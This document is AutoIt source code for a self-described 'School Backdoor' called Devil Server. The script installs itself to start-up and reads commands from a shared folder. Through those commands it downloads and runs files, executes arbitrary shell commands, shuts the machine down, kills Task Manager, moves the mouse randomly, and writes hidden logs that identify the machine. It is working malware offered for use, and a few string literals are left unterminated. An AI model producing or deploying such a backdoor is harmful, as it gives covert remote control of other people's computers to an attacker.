#cs ----------------------------------------------------------------------------
 
 Devil Server ( School Backdoor )
 AutoIt Version: 3.3.14.2

#ce ----------------------------------------------------------------------------

#NoTrayIcon
#include <Misc.au3>
#include <WinAPIFiles.au3>
#include <FileConstants.au3>
#include <MsgBoxConstants.au3>

; The program will not start twice
_Singleton("devil_check_server", 0)

; Read config file
Global $Config_ClientID = IniRead("config.ini", "Config", "ClientID", "defective_client")
Global $Config_ServerPatch = IniRead("config.ini", "Config", "ServerPatch", "C:\")
Global $Config_FirstStart = IniRead("config.ini", "Config", "FirstStart", "0")

; Variables
Global $ServerData = ""
Global $Status_CrazyMouse = "False"
Global $Status_BlockTaskManager = "False"

; ------------------------------------------------------------------------------

; Add backdoor to start-up
If $Config_FirstStart = "1" Then
	If Not FileExists(@StartupDir & "\devil_server.lnk") Then
		FileCreateShortcut(@ScriptFullPath, @StartupDir & "\devil_server.lnk", @ScriptDir, "", "devil_server")
	EndIf

   If FileExists(@StartupDir & "\devil_server.lnk") Then
		MsgBox($MB_OK, "Devil Server", "Devil Server added to start-up!")
	Else
		MsgBox($MB_OK, "Devil Server", "Devil Server can not add self to the start-up! Try again!")
	EndIf
EndIf

; ------------------------------------------------------------------------------

; Loop
While True
	Sleep(100)
	$ServerData = ReadServer()

	; Definition and execution of the received command
	If $ServerData[0] = "load_file" Then
		LoadFile($ServerData[1])
	ElseIf $ServerData[0] = "execute_command" Then
		CMDExecute($ServerData[1])
	ElseIf $ServerData[0] = "show_message" Then
		ShowMessageBox($ServerData[1])
	ElseIf $ServerData[0] = "shutdown" Then
		SystemShutdown()
	ElseIf $ServerData[0] = "block_task_manager" Then
		$Status_BlockTaskManager = $ServerData[1]
	ElseIf $ServerData[0] = "crazy_mouse" Then
		$Status_CrazyMouse = $ServerData[1]
	EndIf

	; Same for crazy mouse and task manager blocker
	If $Status_BlockTaskManager = "True" Then
		BlockTaskManager()
	EndIf
	If $Status_CrazyMouse = "True" Then
		CrazyMouse()
	EndIf

	; Сheck if need to make logs
	If FileExists($Config_ServerPatch & "\LogQuery) Then
		OutputLogs()
		Sleep(1000)
		If FileExists($Config_ServerPatch & "\LogQuery) Then 
			FileDelete($Config_ServerPatch & "\LogQuery) 
		EndIf
	EndIf
WEnd

; ------------------------------------------------------------------------------

; Get data from the shared folder
Func ReadServer()
	If FileExists($Config_ServerPatch & "\" & $Config_ClientID) Then
		Local $Data[2]
		$Data[0] = IniRead($Config_ServerPatch & "\" & $Config_ClientID, "Data", "Type", "")
		$Data[1] = IniRead($Config_ServerPatch & "\" & $Config_ClientID, "Data", "Command", "")
		FileDelete($Config_ServerPatch & "\" & $Config_ClientID)
		Return $Data
	Else
		Local $Data = ["", ""] ; So that the code does not produce errors
		Return $Data
	EndIf
EndFunc

; Write logs to the shared folder 
Func OutputLogs()
	Local $Logs_file = FileOpen($Config_ServerPatch & "\" & $Config_ClientID & "_logs", $FO_APPEND)
	FileSetAttrib($Config_ServerPatch & "\" & $Config_ClientID & "_logs", "+H") ; Hide file
	FileWriteLine($Logs_file, "Time: " & @HOUR & ":" & @MIN)
	FileWriteLine($Logs_file, "Client ID: " & $Config_ClientID)
	FileWriteLine($Logs_file, "Server patch: " & $Config_ServerPatch)
	FileWriteLine($Logs_file, "Client directory: " & @ScriptFullPath)
	FileWriteLine($Logs_file, "System name: " & @ComputerName)
	If FileExists(@StartupDir & "\devil_server.lnk") Then
		FileWriteLine($Logs_file, "Added to start-up: True")
	Else
		FileWriteLine($Logs_file, "Added to start-up: False")
	EndIf
	FileClose($Logs_file)
EndFunc

; Upload and run file
Func LoadFile($File_name)
	FileCopy($Config_ServerPatch & "\" & $File_name, @ScriptDir, 1)
	FileDelete($Config_ServerPatch & "\" & $File_name)
	ShellExecute(@ScriptDir & "\" & $File_name) ; Launch the file
EndFunc

; Execute to shell
Func CMDExecute($Command)
	ShellExecute($Command)
EndFunc

; Show message
Func ShowMessageBox($Text)
	MsgBox($MB_OK, "", $Text, 10)
EndFunc

; Shutdown system
Func SystemShutdown()
	Shutdown(1)
EndFunc

; Block task manager
Func BlockTaskManager()
	If ProcessExists("taskmgr.exe") Then ProcessClose("taskmgr.exe")
EndFunc

; Сrazy mouse
Func CrazyMouse()
	MouseMove(Random(0, @DesktopWidth), Random(0, @DesktopHeight), 1) ; Move mouse to random position
EndFunc

; ------------------------------------------------------------------------------